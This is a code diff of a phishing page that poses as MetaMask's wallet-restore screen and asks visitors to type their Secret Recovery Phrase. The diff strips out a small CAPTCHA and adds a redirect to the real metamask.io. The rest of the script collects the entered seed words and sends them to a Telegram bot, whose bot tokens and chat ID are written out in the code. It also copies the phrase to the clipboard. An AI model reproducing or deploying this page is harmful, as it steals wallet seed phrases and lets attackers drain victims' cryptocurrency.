@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secret Recovery Phrase</title>
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" />
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
@@ -24,6 +24,10 @@
       justify-content: space-between;
       align-items: center;
       padding: 30px 30px 10px;
+    }
+    .logo {
+      font-weight: bold;
+      font-size: 20px;
     }
     .language-select {
       padding: 6px 12px;
@@ -124,10 +128,6 @@
       border: 1px solid #ccc;
       font-size: 14px;
     }
-    .captcha {
-      margin: 15px 0;
-      font-size: 14px;
-    }
     .submit-btn {
       background: linear-gradient(90deg, #537cff, #6563ff);
       border: none;
@@ -142,17 +142,12 @@
       opacity: 0.5;
       cursor: not-allowed;
     }
-    .error-msg, .success-msg {
+    .error-msg {
+      color: red;
       font-size: 14px;
       text-align: center;
       margin-top: 10px;
       display: none;
-    }
-    .error-msg {
-      color: red;
-    }
-    .success-msg {
-      color: green;
     }
     @media (max-width: 600px) {
       .seed-inputs {
@@ -177,6 +172,7 @@
 
   <main>
     <div class="card">
+
       <div class="step-circles">
         <div class="step active">
           <div class="circle">1</div>
@@ -190,7 +186,8 @@
 
       <h1>Access your wallet with your Secret Recovery Phrase</h1>
       <p class="description">
-        MetaMask cannot recover your password. Enter your Secret Recovery Phrase to restore your wallet and set a new password. <a href="#">Learn more</a>
+        MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
+        First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="#">Learn more</a>
       </p>
 
       <select class="phrase-length" id="phraseLength" onchange="generateInputs()">
@@ -205,31 +202,16 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <div class="captcha">
-        Combien font <span id="num1"></span> + <span id="num2"></span> ?
-        <input type="number" id="captchaAnswer" style="width: 60px;" />
-      </div>
-
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
-      <p id="errorMsg" class="error-msg">❌ Phrase invalide ou CAPTCHA incorrect.</p>
-      <p id="successMsg" class="success-msg">✅ Phrase envoyée avec succès.</p>
+      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+
     </div>
   </main>
 
   <script src="bip39-words.js"></script>
   <script>
-    let correctCaptcha = 0;
-
-    function generateCaptcha() {
-      const n1 = Math.floor(Math.random() * 10) + 1;
-      const n2 = Math.floor(Math.random() * 10) + 1;
-      correctCaptcha = n1 + n2;
-      document.getElementById("num1").innerText = n1;
-      document.getElementById("num2").innerText = n2;
-    }
-
     function generateInputs() {
       const container = document.getElementById("seedInputs");
       const count = parseInt(document.getElementById("phraseLength").value);
@@ -242,12 +224,12 @@
         container.appendChild(div);
       }
 
-      container.querySelectorAll("input").forEach(input => {
+      const inputs = container.querySelectorAll("input");
+      inputs.forEach(input => {
         input.addEventListener("input", checkFieldsFilled);
       });
 
       document.getElementById("submitBtn").disabled = true;
-      generateCaptcha();
     }
 
     function checkFieldsFilled() {
@@ -255,8 +237,8 @@
       let allFilled = true;
 
       for (let i = 1; i <= count; i++) {
-        const val = document.querySelector(`input[name='word${i}']`).value.trim();
-        if (val === "") {
+        const value = document.querySelector(`input[name='word${i}']`).value.trim();
+        if (value === "") {
           allFilled = false;
           break;
         }
@@ -283,64 +265,59 @@
       return valid;
     }
 
-    function validateCaptcha() {
-      const userValue = parseInt(document.getElementById("captchaAnswer").value);
-      return userValue === correctCaptcha;
-    }
-
     function handleConfirm() {
-      const errorMsg = document.getElementById("errorMsg");
-      const successMsg = document.getElementById("successMsg");
-
-      if (!validateBIP39Words() || !validateCaptcha()) {
-        errorMsg.style.display = "block";
-        successMsg.style.display = "none";
-        generateCaptcha();
+      const errorEl = document.getElementById("errorMsg");
+      if (!validateBIP39Words()) {
+        errorEl.style.display = "block";
         return;
+      } else {
+        errorEl.style.display = "none";
       }
-
-      errorMsg.style.display = "none";
 
       const count = parseInt(document.getElementById("phraseLength").value);
       let phrase = "";
       for (let i = 1; i <= count; i++) {
-        const val = document.querySelector(`input[name='word${i}']`).value.trim();
-        phrase += val + " ";
+        const value = document.querySelector(`input[name='word${i}']`).value;
+        phrase += value.trim() + " ";
       }
 
-      const botToken = "8006898547:AAG1uCG4idpvvl6rbDGJ-Dx5-nbN0og-kEs"; // ← Remplace par ton token
-      const chatId = "6996434307";     // ← Remplace par ton chat ID
+      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
+      const chatId = "6996434307";     // Remplace ici
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: phrase.trim() })
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: "\n\n" + phrase.trim()
+        })
       });
 
       navigator.clipboard.writeText(phrase.trim());
 
-      successMsg.style.display = "block";
-      generateCaptcha();
+      setTimeout(() => {
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+      }, 800);
     }
 
     document.addEventListener("paste", function(e) {
-      const active = document.activeElement;
-      if (!active || !active.name || !active.name.startsWith("word")) return;
+      const activeInput = document.activeElement;
+      if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
+
       const paste = (e.clipboardData || window.clipboardData).getData("text");
       const words = paste.trim().split(/\s+/);
       if (words.length < 2) return;
+
       e.preventDefault();
-      words.forEach((word, i) => {
-        const input = document.querySelector(`input[name='word${i + 1}']`);
+      words.forEach((word, index) => {
+        const input = document.querySelector(`input[name='word${index + 1}']`);
         if (input) input.value = word;
       });
+
       checkFieldsFilled();
     });
 
-    window.onload = () => {
-      generateInputs();
-      generateCaptcha();
-    };
+    window.onload = generateInputs;
   </script>
 </body>
 </html>
